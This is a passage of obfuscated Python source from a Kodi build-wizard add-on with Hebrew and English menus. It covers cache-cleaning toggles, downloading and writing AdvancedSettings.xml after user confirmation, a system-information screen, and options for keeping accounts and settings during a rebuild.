		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0000OO00OOOOOO00 .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2902
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2903
	addFile ('Include Video Cache in Clear Cache: %s'%OO0O0OOO000O0000O .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2904
	if OO0O0OOO000O0000O =='true':#line:2905
		addFile ('--- Include All Video Addons: %s'%O0O00O0O0OO00OO0O .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2906
		addFile ('--- Include Bob: %s'%OOOO0OO000OOOO000 .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- Include Phoenix: %s'%OOO000O0O00O0O000 .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- Include Specto: %s'%OOO00OOO0O0000OO0 .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		addFile ('--- Include Exodus: %s'%O0OOOOOOO0OOOO00O .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Salts: %s'%OO00O0O000OO00000 .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include Salts HD Lite: %s'%O0O00OOO0OOO0OOOO .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include One Channel: %s'%OO00O0OOOOOO0OO0O .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include Genesis: %s'%OO0O0O0O0000OO000 .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2916
	setView ('files','viewType')#line:2917
def advancedWindow (url =None ):#line:2919
	if not ADVANCEDFILE =='http://':#line:2920
		if url ==None :#line:2921
			O0O0OO0O0OOO0OO00 =wiz .workingURL (ADVANCEDFILE )#line:2922
			OO0O00OO0OOO0OOOO =uservar .ADVANCEDFILE #line:2923
		else :#line:2924
			O0O0OO0O0OOO0OO00 =wiz .workingURL (url )#line:2925
			OO0O00OO0OOO0OOOO =url #line:2926
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2927
		if os .path .exists (ADVANCED ):#line:2928
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2929
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2930
		if O0O0OO0O0OOO0OO00 ==True :#line:2931
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2932
			OO0OO0O0000OOOO0O =wiz .openURL (OO0O00OO0OOO0OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2933
			OOOOO0OO0O0O000OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OO0O0000OOOO0O )#line:2934
			if len (OOOOO0OO0O0O000OO )>0 :#line:2935
				for O00O00000O00O00OO ,O0OO00O0O0OOOO0O0 ,url ,OOOOO0000O0O00OO0 ,OO00O0OOO00OO0OOO ,O00O0O0OO0O0O000O in OOOOO0OO0O0O000OO :#line:2936
					if O0OO00O0O0OOOO0O0 .lower ()=="yes":#line:2937
						addDir ("[B]%s[/B]"%O00O00000O00O00OO ,'advancedsetting',url ,description =O00O0O0OO0O0O000O ,icon =OOOOO0000O0O00OO0 ,fanart =OO00O0OOO00OO0OOO ,themeit =THEME3 )#line:2938
					else :#line:2939
						addFile (O00O00000O00O00OO ,'writeadvanced',O00O00000O00O00OO ,url ,description =O00O0O0OO0O0O000O ,icon =OOOOO0000O0O00OO0 ,fanart =OO00O0OOO00OO0OOO ,themeit =THEME2 )#line:2940
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2941
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O0OO0O0OOO0OO00 )#line:2942
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2943
def writeAdvanced (O0000O0O00000OO00 ,OO0OOO0000OOO00O0 ):#line:2945
	O00OOOO0O0O0O00O0 =wiz .workingURL (OO0OOO0000OOO00O0 )#line:2946
	if O00OOOO0O0O0O00O0 ==True :#line:2947
		if os .path .exists (ADVANCED ):O0O0O0O00O000OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0000O0O00000OO00 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2948
		else :O0O0O0O00O000OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0000O0O00000OO00 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2949
		if O0O0O0O00O000OOOO ==1 :#line:2951
			OO0OO00OO0OOO0OO0 =wiz .openURL (OO0OOO0000OOO00O0 )#line:2952
			OOO0O00O0O0000OO0 =open (ADVANCED ,'w');#line:2953
			OOO0O00O0O0000OO0 .write (OO0OO00OO0OOO0OO0 )#line:2954
			OOO0O00O0O0000OO0 .close ()#line:2955
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2956
			wiz .killxbmc (True )#line:2957
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2958
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O00OOOO0O0O0O00O0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2959
def viewAdvanced ():#line:2961
	OO0OOOO00O0000OO0 =open (ADVANCED )#line:2962
	OOOOO0O0O00OOOOO0 =OO0OOOO00O0000OO0 .read ().replace ('\t','    ')#line:2963
	wiz .TextBox (ADDONTITLE ,OOOOO0O0O00OOOOO0 )#line:2964
	OO0OOOO00O0000OO0 .close ()#line:2965
def removeAdvanced ():#line:2967
	if os .path .exists (ADVANCED ):#line:2968
		wiz .removeFile (ADVANCED )#line:2969
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2970
def showAutoAdvanced ():#line:2972
	notify .autoConfig ()#line:2973
def getIP ():#line:2975
	OOO00O0OO0OOO0000 ='http://whatismyipaddress.com/'#line:2976
	if not wiz .workingURL (OOO00O0OO0OOO0000 ):return 'Unknown','Unknown','Unknown'#line:2977
	O00000000OO00O0OO =wiz .openURL (OOO00O0OO0OOO0000 ).replace ('\n','').replace ('\r','')#line:2978
	if not 'Access Denied'in O00000000OO00O0OO :#line:2979
		O00O00OOOO00OO000 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O00000000OO00O0OO )#line:2980
		OOO000OO0OO0O0OO0 =O00O00OOOO00OO000 [0 ]if (len (O00O00OOOO00OO000 )>0 )else 'Unknown'#line:2981
		OO00O00O0OOOO0OO0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O00000000OO00O0OO )#line:2982
		OO0OOOOO000O00O00 =OO00O00O0OOOO0OO0 [0 ]if (len (OO00O00O0OOOO0OO0 )>0 )else 'Unknown'#line:2983
		O00000000O0O0O000 =OO00O00O0OOOO0OO0 [1 ]+', '+OO00O00O0OOOO0OO0 [2 ]+', '+OO00O00O0OOOO0OO0 [3 ]if (len (OO00O00O0OOOO0OO0 )>2 )else 'Unknown'#line:2984
		return OOO000OO0OO0O0OO0 ,OO0OOOOO000O00O00 ,O00000000O0O0O000 #line:2985
	else :return 'Unknown','Unknown','Unknown'#line:2986
def systemInfo ():#line:2988
	O00000O0O0O000OO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3002
	OO000O000OOOOO000 =[];OOO0O00OOO0O00OOO =0 #line:3003
	for O00000000O000OOOO in O00000O0O0O000OO0 :#line:3004
		OO00O0OOO0O0OOOO0 =wiz .getInfo (O00000000O000OOOO )#line:3005
		OO0000OOOOO0OO0O0 =0 #line:3006
		while OO00O0OOO0O0OOOO0 =="Busy"and OO0000OOOOO0OO0O0 <10 :#line:3007
			OO00O0OOO0O0OOOO0 =wiz .getInfo (O00000000O000OOOO );OO0000OOOOO0OO0O0 +=1 ;wiz .log ("%s sleep %s"%(O00000000O000OOOO ,str (OO0000OOOOO0OO0O0 )));xbmc .sleep (1000 )#line:3008
		OO000O000OOOOO000 .append (OO00O0OOO0O0OOOO0 )#line:3009
		OOO0O00OOO0O00OOO +=1 #line:3010
	OOO0OO0O0OOO0OOO0 =OO000O000OOOOO000 [8 ]if 'Una'in OO000O000OOOOO000 [8 ]else wiz .convertSize (int (float (OO000O000OOOOO000 [8 ][:-8 ]))*1024 *1024 )#line:3011
	O0OOO00OOO000O000 =OO000O000OOOOO000 [9 ]if 'Una'in OO000O000OOOOO000 [9 ]else wiz .convertSize (int (float (OO000O000OOOOO000 [9 ][:-8 ]))*1024 *1024 )#line:3012
	OO0OOOOO00OO00O0O =OO000O000OOOOO000 [10 ]if 'Una'in OO000O000OOOOO000 [10 ]else wiz .convertSize (int (float (OO000O000OOOOO000 [10 ][:-8 ]))*1024 *1024 )#line:3013
	O0OOOOO000O0O000O =wiz .convertSize (int (float (OO000O000OOOOO000 [11 ][:-2 ]))*1024 *1024 )#line:3014
	OOOOOOOO00O0O000O =wiz .convertSize (int (float (OO000O000OOOOO000 [12 ][:-2 ]))*1024 *1024 )#line:3015
	O00OO00OO0OO00OOO =wiz .convertSize (int (float (OO000O000OOOOO000 [13 ][:-2 ]))*1024 *1024 )#line:3016
	OOOO00OOO00000O00 ,O0OOOO0OOO0OOOO0O ,O0OO00O0000OOOOO0 =getIP ()#line:3017
	OO000OOO0OOOOOO00 =[];OO0OO0OOO0000O00O =[];O0O0OOOOO0O0O0O0O =[];O0OOO0OOO0O0O0000 =[];O00000OOOOO0OOO0O =[];O000O0OOOO00OO0OO =[];OO0OO0OOOOOOOO0OO =[]#line:3019
	OO00O000OO00000O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3021
	for O0O0OO000O00OO0O0 in sorted (OO00O000OO00000O0 ,key =lambda O0O00O0O0O0O00000 :O0O00O0O0O0O00000 ):#line:3022
		O00OO000OO0OOO0OO =os .path .split (O0O0OO000O00OO0O0 [:-1 ])[1 ]#line:3023
		if O00OO000OO0OOO0OO =='packages':continue #line:3024
		OOO0OOOOOOOO00OO0 =os .path .join (O0O0OO000O00OO0O0 ,'addon.xml')#line:3025
		if os .path .exists (OOO0OOOOOOOO00OO0 ):#line:3026
			OO00O0O000OOOOOO0 =open (OOO0OOOOOOOO00OO0 )#line:3027
			OOOO000O0O0000O0O =OO00O0O000OOOOOO0 .read ()#line:3028
			OO0OO000O0000OOOO =re .compile ("<provides>(.+?)</provides>").findall (OOOO000O0O0000O0O )#line:3029
			if len (OO0OO000O0000OOOO )==0 :#line:3030
				if O00OO000OO0OOO0OO .startswith ('skin'):OO0OO0OOOOOOOO0OO .append (O00OO000OO0OOO0OO )#line:3031
				if O00OO000OO0OOO0OO .startswith ('repo'):O00000OOOOO0OOO0O .append (O00OO000OO0OOO0OO )#line:3032
				else :O000O0OOOO00OO0OO .append (O00OO000OO0OOO0OO )#line:3033
			elif not (OO0OO000O0000OOOO [0 ]).find ('executable')==-1 :O0OOO0OOO0O0O0000 .append (O00OO000OO0OOO0OO )#line:3034
			elif not (OO0OO000O0000OOOO [0 ]).find ('video')==-1 :O0O0OOOOO0O0O0O0O .append (O00OO000OO0OOO0OO )#line:3035
			elif not (OO0OO000O0000OOOO [0 ]).find ('audio')==-1 :OO0OO0OOO0000O00O .append (O00OO000OO0OOO0OO )#line:3036
			elif not (OO0OO000O0000OOOO [0 ]).find ('image')==-1 :OO000OOO0OOOOOO00 .append (O00OO000OO0OOO0OO )#line:3037
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3039
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOOOO000 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3040
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOOOO000 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3041
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3042
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOOOO000 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3043
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOOOO000 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3044
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3046
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOOOO000 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOOOO000 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O0OOO0OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OOO000O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOOO00OO00O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOOO000O0O000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOO00O0O000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO00OO0OO00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOOOO000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OOO00000O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO0OOO0OOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0000OOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOOOO000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	O0OOOO000000OO000 =len (OO000OOO0OOOOOO00 )+len (OO0OO0OOO0000O00O )+len (O0O0OOOOO0O0O0O0O )+len (O0OOO0OOO0O0O0000 )+len (O000O0OOOO00OO0OO )+len (OO0OO0OOOOOOOO0OO )+len (O00000OOOOO0OOO0O )#line:3067
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0OOOO000000OO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OOOOO0O0O0O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO0OOO0O0O0000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO0OOO0000O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO000OOO0OOOOOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00000OOOOO0OOO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO0OOOOOOOO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O0OOOO00OO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
def Menu ():#line:3076
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3077
def saveMenu ():#line:3079
	O0OO0OO0000OOO0O0 ='[COLOR yellow]מופעל[/COLOR]';OOO0OO00OO00OO0OO ='[COLOR blue]מבוטל[/COLOR]'#line:3081
	O00O00O000O0O00OO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3082
	OO0O0OO0OO00O000O ='true'if KEEPMOVIELIST =='true'else 'false'#line:3083
	OOO00O000OO0O0000 ='true'if KEEPINFO =='true'else 'false'#line:3084
	O0OO0O00O00O0OOOO ='true'if KEEPSOUND =='true'else 'false'#line:3086
	OO0O00O000OO0O00O ='true'if KEEPVIEW =='true'else 'false'#line:3087
	OOOOO0O00OOOOO000 ='true'if KEEPSKIN =='true'else 'false'#line:3088
	O0OOOO00O000OO0O0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3089
	O000O0OOO00OOO000 ='true'if KEEPSKIN3 =='true'else 'false'#line:3090
	O00O00OO00O000O0O ='true'if KEEPADDONS =='true'else 'false'#line:3091
	O0O000O0OOOO0O0OO ='true'if KEEPPVR =='true'else 'false'#line:3092
	OO0OO00OOOOOO00OO ='true'if KEEPTVLIST =='true'else 'false'#line:3093
	O00OOO00O00O0O00O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3094
	OO000OOOO0OO0OOOO ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3095
	O0O0O0OOO0000OO0O ='true'if KEEPHUBTV =='true'else 'false'#line:3096
	O0OO0O0O0000O000O ='true'if KEEPHUBVOD =='true'else 'false'#line:3097
	OO0O0OO00OOOOO00O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3098
	OOO00O0O00000OOO0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3099
	O0O00OO00O0000O0O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3100
	O00OO0OOO0OO0O0O0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3101
	OO0O0O0000O00O0O0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3102
	OO00OOOO0OO0OOOO0 ='true'if KEEPTRAKT =='true'else 'false'#line:3103
	OO000O00000OO0O00 ='true'if KEEPREAL =='true'else 'false'#line:3104
	O0OO0000O00O0O00O ='true'if KEEPRD2 =='true'else 'false'#line:3105
	OO00OO0O0O0OO0000 ='true'if KEEPTORNET =='true'else 'true'#line:3106
	O00O000O000O0OOO0 ='true'if KEEPLOGIN =='true'else 'false'#line:3107
	OOOO00OOOO0O0OOO0 ='true'if KEEPSOURCES =='true'else 'false'#line:3108
	O00000OOOOOO00O0O ='true'if KEEPADVANCED =='true'else 'false'#line:3109
	O00OOOOO0OOO000OO ='true'if KEEPPROFILES =='true'else 'false'#line:3110
	OO000OOOOO0O0000O ='true'if KEEPFAVS =='true'else 'false'#line:3111
	OOO0000O00O0OOOOO ='true'if KEEPREPOS =='true'else 'false'#line:3112
	O0000O0OO00OO00O0 ='true'if KEEPSUPER =='true'else 'false'#line:3113
	O0OOO000O0000O0OO ='true'if KEEPWHITELIST =='true'else 'false'#line:3114
	OOO00O00OO0O0O00O ='true'if KEEPWEATHER =='true'else 'false'#line:3115
	O00O00OO00O00O0O0 ='true'if KEEPVICTORY =='true'else 'false'#line:3116
	if O0OOO000O0000O0OO =='true':#line:3119
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3120
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3121
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3122
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3123
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3124
	addFile ('%s שמירת חשבון RD:  '%OO000O00000OO0O00 .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3127
	addFile ('%s שמירת חשבון טראקט:  '%OO00OOOO0OO0OOOO0 .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת מועדפים:  '%OO000OOOOO0O0000O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0O000O0OOOO0O0OO .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O00O00OO00O00O0O0 .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO0OO00OOOOOO00OO .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת אריח סרטים:  '%O00OOO00O00O0O00O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת אריח סדרות:  '%OO000OOOO0OO0OOOO .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת אריח טלויזיה:  '%O0O0O0OOO0000OO0O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0OO0O0O0000O000O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת אריח ספורט:  '%OO0O0OO00OOOOO00O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח ילדים:  '%OOO00O0O00000OOO0 .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת אריח מוסיקה:  '%O0O00OO00O0000O0O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O00OO0OOO0OO0O0O0 .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת כל האריחים בסקין:  '%OOOOO0O00OOOOO000 .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OOO00O00OO0O0O00O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O00O00OO00O000O0O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3150
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OOO00O000OO0O0000 .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3151
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OO0O0OO0OO00O000O .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3154
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OOOO00OOOO0O0OOO0 .replace ('true',O0OO0OO0000OOO0O0 ).replace ('false',OOO0OO00OO00OO0OO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3155
